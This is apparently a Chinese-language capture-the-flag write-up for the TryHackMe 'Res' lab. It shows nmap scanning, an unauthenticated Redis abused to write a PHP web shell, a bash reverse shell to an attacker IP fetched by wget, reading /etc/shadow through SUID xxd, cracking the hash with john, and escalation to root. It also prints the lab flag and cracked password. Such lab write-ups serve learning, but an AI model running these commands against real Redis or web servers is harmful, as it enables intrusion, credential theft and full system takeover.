# Res Writeup
> URL : https://tryhackme.com/room/res

IP : 10.10.149.195
## Recon 
- 先來老梗的 `nmap -A 10.10.149.195`
	- ```
		Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-01 01:29 EDT
		Nmap scan report for 10.10.149.195
		Host is up (0.29s latency).
		Not shown: 999 closed ports
		PORT   STATE SERVICE VERSION
		80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
		|_http-server-header: Apache/2.4.18 (Ubuntu)
		|_http-title: Apache2 Ubuntu Default Page: It works
		![](https://i.imgur.com/3PG5lnw.png)
		```
- `python3 dirsearch.py -u http://10.10.149.195/ -e all`
	- 發現完全沒東西

- Scan the machine, how many ports are open?
	- 理論上要掃全部的 port
	- `nmap -p- 10.10.149.195`
		- 雖然很有效果，但很浪費時間 QQ 
		- ![](https://i.imgur.com/pXT3iBK.png)
			- 掃ㄌ將近 20 分鐘QQ
	- 因為喵到下面說 port 是 `****`
		- 所以我猜測是 `1000~9999` 
		- `nmap -p 1000-9999 10.10.149.195`
		- ![](https://i.imgur.com/DOdP5oL.png)
	- 答案 `6379`
	- ~其實這題題目跟 logo 就很明顯ㄌ~~ 

-  Scan the machine, how many ports are open?
	- 2 個 port
	- 80 與 6379
- What's is the database management system installed on the server?
	- 6379 是 `redis`

- What port is the database management system running on?
	- `6379`

- What's is the version of management system installed on the server?
	- `nmap -p6379 -A 10.10.149.195`
	- ![](https://i.imgur.com/U3zpxcL.png)
	- 可以看到是 `6.0.7`
	- 嘗試 Google 過，找不到這個版本的 Exploit
	- 找不到 exploit
## 寫入 shell
- 使用 redis cli 連上
	- `redis-cli -h 10.10.149.195`
		- 進行連線
	- `config set dir "/var/www/html"`
	- `config set dbfilename meow.php`
	- `set x "\r\n\r\n<?php phpinfo();?>\r\n\r\n"`
	- `save`
	- ![](https://i.imgur.com/JcdaDCJ.png)
	- 成功寫入 phpinfo
- 寫入 web shell
	- `config set dbfilename shell.php`
	- `set x "\r\n\r\n<?php system($_GET[A]);?>\r\n\r\n"`
	- `save`
	- ![](https://i.imgur.com/O4CuqmG.png)
		- 成功寫入 webshell 且可以使用 ls
- 上傳 reverse shell
	- 本地端準備
		- `bash -c 'bash -i >& /dev/tcp/10.13.21.55/7877 0>&1'`
		- 存在 `s` 檔案中
		- 並使用 `python3 -m http.server` 開啟網頁伺服器
	- `http://10.10.149.195/shell.php?A=wget 10.13.21.55:8000/s -O /tmp/s`
		- 把檔案存下來
	- `http://10.10.149.195/shell.php?A=cat%20/tmp/s`
		- ![](https://i.imgur.com/4NSeNM8.png)
		- 確認寫入正常

- 執行 reverse shell
	- 本地端準備 `nc -vlk 7877`
	- 訪問 `http://10.10.149.195/shell.php?A=bash%20/tmp/s`
	- ![](https://i.imgur.com/yg4T57M.png)
	- 成功接上 reverse shell

- 本地亂逛
	- `python -c 'import pty; pty.spawn("/bin/bash")'`
		- 互動式 bash
- 尋找 user flag
	- 檔案在 `/home/vianka/user.txt`
	- ![](https://i.imgur.com/8fMHD4J.png)
	- `thm{red1s_rce_w1thout_credent1als}`

## 提權
- Linpeas
	- `wget 10.13.21.55:8000/linpeas.sh`
		- 下載 linpeas
	- `bash linpeas.sh | tee out.txt`
		- 執行
	- 發現有標顏色的 suid
		- ![](https://i.imgur.com/ns4piX0.png)
		- xxd
- suid xxd 提權
	- gtfobins 找到 suid xxd 讀檔
		- https://gtfobins.github.io/gtfobins/xxd/#suid
	- 要破解密碼的話可以破 `/etc/shadow` 的 hash
		- `LFILE=/etc/shadow`
		- `xxd "$LFILE" | xxd -r`
	- 可以順利回傳 `/etc/shadow` 
		- ![](https://i.imgur.com/nxX3vgl.png)
		- `vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
`
- 爆破密碼
	- 複製 vianka 的 hash 到本地端
	- 呼叫約翰
		- `john j.txt --wordlist=/opt/rockyou.txt`
		- ![](https://i.imgur.com/tXqClMc.png)
		- 成功破解密碼為 `beautiful1`

- 切換使用者
	- `su vianka`
		- 切換使用者，並切換密碼為 `beautiful1`
	- ![](https://i.imgur.com/xhOUOpr.png)
- 確認權限
	- 輸入 `sudo -l`
		- ![](https://i.imgur.com/uDeeXfv.png)
		- 發現使用者可以用 `sudo`
	- 使用 `sudo su` 切換到 root
	- 成功取得 root flag
		- ![](https://i.imgur.com/pzGRECw.png)
